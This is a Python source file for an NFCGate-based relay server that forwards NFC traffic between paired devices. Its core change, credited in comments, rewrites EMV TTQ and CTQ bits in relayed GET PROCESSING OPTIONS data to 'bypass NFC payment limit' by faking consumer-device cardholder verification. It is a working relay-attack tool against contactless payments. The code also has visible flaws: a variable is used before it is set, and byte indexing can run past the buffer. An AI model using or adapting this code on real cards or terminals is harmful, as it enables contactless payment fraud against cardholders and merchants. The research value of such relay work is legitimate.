#!/usr/bin/env python3

import socketserver
import struct
import sys
import datetime

HOST = "0.0.0.0"
PORT = 5566


class PluginHandler:
    def __init__(self):
        self.plugin_list = []

        for modname in sys.argv[1:]:
            self.plugin_list.append((modname, __import__("plugins.mod_%s" % modname, fromlist=["plugins"])))
            print("Loaded", "mod_%s" % modname)

    def filter(self, log, data):
        for modname, plugin in self.plugin_list:
            data = plugin.handle_data(lambda *x: log(*x, tag=modname), data)

        return data


class NFCGateClientHandler(socketserver.StreamRequestHandler):
    def __init__(self, request, client_address, srv):
        super().__init__(request, client_address, srv)
        
    def log(self, *args, tag="server"):
        self.server.log(*args, origin=self.client_address, tag=tag)

    def setup(self):
        super().setup()
        
        self.session = None
        self.request.settimeout(300)
        self.log("server", "connected")

    def handle(self):
        super().handle()

        while True:
            msg_len_data = self.rfile.read(5)
            if len(msg_len_data) < 5:
                break

            msg_len, session = struct.unpack("!IB", msg_len_data)
            data = self.rfile.read(msg_len)
            self.log("server", "data:", bytes(data))

            # no data was sent or no session number supplied and none set yet
            if msg_len == 0 or session == 0 and self.session is None:
                break

            # change in session number detected
            if self.session != session:
                # remove from old association
                self.server.remove_client(self, self.session)
                # update and add association
                self.session = session
                self.server.add_client(self, session)
                
            #print('[{}]'.format(', '.join(hex(x) for x in data)))
            
            #Bypass NFC Payment limit (Salvador Mendoza - salmg.net - @netxing)
            #By modifying CDCVM during the relay
            
            data2 = [int(x) for x in data] # copy of data
            
            for x in range(0,len(data)):
                if(data[x] == 0x9F and data[x+1] == 0x66):          #TTQ  - (byte 2, bit 7)
                    print("!! TTQ detected")
                    ttq = True                                      #It will check GET PROCESSING
                    break
                
                if(ttq and data[x]==0x80 and data[x+1] == 0xa8):    #TTQ  - (byte 2, bit 7) in GET PROCESSING
                    print("!! Modifing GET PROCESSING if necessary")
                    ttq = False
                    if(data[x+8] & (1<<(7-1))):                     # Modify bit 7 in byte 2 to "0" if it is "1"
                        data2[x+8] = int(bin(data[x+8] ^ (1<<6)),2)
                        break
                        
                if(data[x] == 0x9f and data[x+1] == 0x6c):          #CTQ - (byte 2, bit 8)
                    if(not data[x+8] & (1<<(8-1))):                 # if bit 8 in byte 2 is not 1, flip it to "0"
                        data2[x+4] = int(bin(data[x+4] ^ (1<<7)),2)
                        break
            #print('[{}]'.format(', '.join(hex(x) for x in data2)))
            
            data3 = bytes(data2)
            
            # allow plugins to filter data before sending it to all clients in the session
            self.server.send_to_clients(self.session, self.server.plugins.filter(self.log, data3), self)
 
    def finish(self):
        super().finish()

        self.server.remove_client(self, self.session)
        self.log("server", "disconnected")


class NFCGateServer(socketserver.ThreadingTCPServer):
    def __init__(self, server_address, request_handler, bind_and_activate=True):
        self.allow_reuse_address = True
        super().__init__(server_address, request_handler, bind_and_activate)

        self.clients = {}
        self.plugins = PluginHandler()
        self.log("NFCGate server listening on", server_address)
        
    def log(self, *args, origin="0", tag="server"):
        print(datetime.datetime.now(), "["+tag+"]", origin, *args)

    def add_client(self, client, session):
        if session is None:
            return

        if session not in self.clients:
            self.clients[session] = []

        self.clients[session].append(client)
        client.log("joined session", session)

    def remove_client(self, client, session):
        if session is None or session not in self.clients:
            return

        self.clients[session].remove(client)
        client.log("left session", session)

    def send_to_clients(self, session, msg, origin):
        if session is None or session not in self.clients:
            return

        for client in self.clients[session]:
            # do not send message back to originator
            if client is origin:
                continue

            client.wfile.write(int.to_bytes(len(msg), 4, byteorder='big'))
            client.wfile.write(msg)

        self.log("Publish reached", len(self.clients[session]) - 1, "clients")


if __name__ == "__main__":
    NFCGateServer((HOST, PORT), NFCGateClientHandler).serve_forever()
